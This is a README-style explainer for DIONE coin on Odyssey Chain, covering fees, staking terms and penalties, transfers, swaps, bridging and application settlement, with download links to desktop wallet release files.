![DIONE Wallet](assets/banner-article.png)

# What You Can Do With DIONE Coin

<p align="center">Fees, staking, apps and transfers</p>

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-006971?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Windows"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-006971?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-006971?style=for-the-badge&logo=linux&logoColor=white" alt="Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-66519E?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white&labelColor=1B1B1D" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`dione-wallet-v4.5.9.exe`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-66519E?style=flat-square&logo=apple&logoColor=white&labelColor=1B1B1D" alt="macOS"> | macOS 12 or later | [`dione-wallet-v4.5.9.dmg`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-66519E?style=flat-square&logo=linux&logoColor=white&labelColor=1B1B1D" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dione-wallet-v4.5.9.zip`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip) |

</div>

All versions and checksums are on the [v4.5.9 release page](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9).

> [!WARNING]
> Only download from this GitHub release page. A mirror, a search advertisement or a file sent in a chat is not the project.

DIONE pays for everything on Odyssey Chain: transfers, staking, claims, swaps and bridging. It is staked to validators for rewards, settled by applications built on the chain, and held as an asset in its own right. Without it you cannot use the chain at all, because fees are paid in it and in nothing else.

## The five things it does

| Use | What it means in practice |
| --- | --- |
| Fees | every transaction on Odyssey Chain costs DIONE |
| Staking | bond it to a validator, earn the programme's rate |
| Settlement | applications on the chain, including the energy marketplace |
| Transfers | send value to another address |
| Collateral for access | holding it is a prerequisite for using the chain at all |

The last one is not a separate feature; it is the consequence of the first. A wallet with no DIONE can see the chain and cannot act on it.

## Do you need DIONE to use Odyssey Chain?

Yes. Gas is denominated in the native asset, and the chain does not accept anything else for it. Receiving DIONE needs nothing; sending, staking, swapping or approving anything requires a balance to pay the fee.

That has two practical consequences worth internalising:

- **A balance staked to the last coin cannot undelegate**, because the exit transaction has its own fee.
- **An asset bridged in without DIONE is stranded**, visible and immovable until some DIONE arrives.

Both are avoidable with a small reserve, and both are common enough to be worth stating twice. [Odyssey Chain Gas Fees Inside DIONE Wallet](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/odyssey-chain-gas-fees-in-dione-wallet.md) covers the fee market.

## Can you pay fees in another token on Odyssey?

No. Fee payment in a non-native token is a feature some chains build deliberately, with a paymaster or a sponsored transaction; on Odyssey Chain the fee is paid in DIONE.

What you can do instead is the ordinary workaround: keep a small DIONE balance for fees while holding everything else in whatever form you prefer. That is a portfolio decision rather than a chain feature.

## Staking, and what it pays

Delegating to a validator earns a 1% base reward per 30-day period, with an 8% annual maximum, less the validator's commission. The minimum delegation is 10,000 DIONE, the unbonding period is 10 days, and leaving before consolidation carries a penalty of 7%, 6% or 5% depending on timing.

That combination means staking is for DIONE you can leave alone. [How to Stake DIONE Coin](https://github.com/dione-protocol/staking-and-network/blob/main/how-to-stake-dione-coin.md) is the procedure, [DIONE Staking Rewards Explained](https://github.com/dione-protocol/staking-and-network/blob/main/dione-staking-rewards-explained.md) the terms, and [DIONE Staking Minimums and Early-Unstake Penalties](https://github.com/dione-protocol/staking-and-network/blob/main/dione-staking-minimum-and-penalties.md) the exit costs.

## Sending and receiving

The plainest use: value moves between addresses on the chain, with a fee and a confirmation. Addresses look like Ethereum addresses, which is why the network rather than the address decides where a balance lives.

Repeat sends are easier with the address book, which keeps saved addresses on your own machine, stored encrypted, so a regular recipient is not pasted from memory each time. It is a convenience rather than a safeguard: nothing in it can verify that a saved address is still the one you meant, and it is lost with the machine if you never wrote it down elsewhere.

Two habits prevent most losses: send a small test amount to a new address, and confirm the arrival on the explorer rather than in the sending wallet's history.

## Swapping and bridging

Swapping happens on decentralised venues the wallet links to - AmaraSwap and DiamondSwap - where DIONE trades against other assets on the chain. [Swap on AmaraSwap Using DIONE Wallet](https://github.com/dione-protocol/keys-and-transfers/blob/main/swap-on-amaraswap-using-dione-wallet.md) covers the flow, including the approval step people forget.

Bridging moves value between chains, through a route that supports both sides. It produces a wrapped representation rather than converting anything, and it needs gas on both ends. [Bridge DIONE to Odyssey Chain With Wanchain](https://github.com/dione-protocol/keys-and-transfers/blob/main/bridge-dione-to-odyssey-with-wanchain.md) sets out the mechanics.

## Settlement for applications

The energy marketplace is the clearest example: trades settle on Odyssey Chain, and settlement costs DIONE. The same applies to any application built on the chain - the native asset is how blockspace is bought.

That is where demand for the token comes from in a structural sense, and it is worth being precise: an application that is used creates fee demand, and one that is not creates none. [Nebra Energy Trading on DIONE](https://github.com/dione-protocol/staking-and-network/blob/main/nebra-energy-trading-on-dione.md) describes the marketplace.

## Holding, and what holding is not

Holding DIONE is a legitimate use - it is an asset on a chain with a fixed total supply - but holding alone earns nothing. There is no staking reward for an idle balance, no automatic yield, and no mechanism that pays holders for existing.

That distinction matters when comparing options: an idle balance is exposed to price and earns no fees, while a delegated balance earns the programme's rate and accepts a 10-day exit. Both are choices; neither is the default right answer.

## What you cannot do with it

Three limits worth stating, because expectations run ahead of the chain:

**It does not pay gas on other chains.** Bridged forms may be usable where they land, but native DIONE is for Odyssey Chain.

**It does not buy into the marketplace directly.** Nebra settles in DIONE; it is not a subscription or an access token.

**It does not confer governance rights in the published material.** Nothing in the project's documentation describes token voting over protocol parameters.

## A sensible order of operations

For someone arriving with DIONE to use:

1. Put it in a wallet you control, with the phrase backed up.
2. Keep a small fee reserve outside any stake.
3. Stake only what can stay bonded for weeks.
4. Use the explorer to confirm anything that matters.

Four steps, and each one prevents a specific and common loss. [Create a New DIONE Wallet: First Run Walkthrough](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/create-a-new-dione-wallet.md) is where step one starts.

## Keep the install current

DIONE Wallet is actively maintained, and the current release is published on the releases page.

Every use above runs through a wallet, so a build that is behind can make a working chain look broken. Install from [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9) before concluding a feature is missing.

## FAQ

### What can I do with DIONE coin?

Pay fees on Odyssey Chain, stake to validators, settle applications, send value, and swap or bridge through supported venues.

### Do I need DIONE to use Odyssey Chain?

Yes. Gas is paid in the native asset, so receiving needs nothing and acting needs a balance.

### Can I pay fees in another token on Odyssey?

No. Fee payment is in DIONE; keep a small reserve for it while holding the rest however you prefer.

### Does holding DIONE earn anything?

No. Only delegated stake earns the programme's rate; an idle balance earns nothing and has no exit cost.

### Is DIONE a governance token?

Nothing in the published material describes token voting over protocol parameters.

The token's uses are concrete and mostly fee-shaped, which is the least glamorous and most reliable thing about it. The fee market is in [Odyssey Chain Gas Fees Inside DIONE Wallet](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/odyssey-chain-gas-fees-in-dione-wallet.md) and staking in [How to Stake DIONE Coin](https://github.com/dione-protocol/staking-and-network/blob/main/how-to-stake-dione-coin.md).
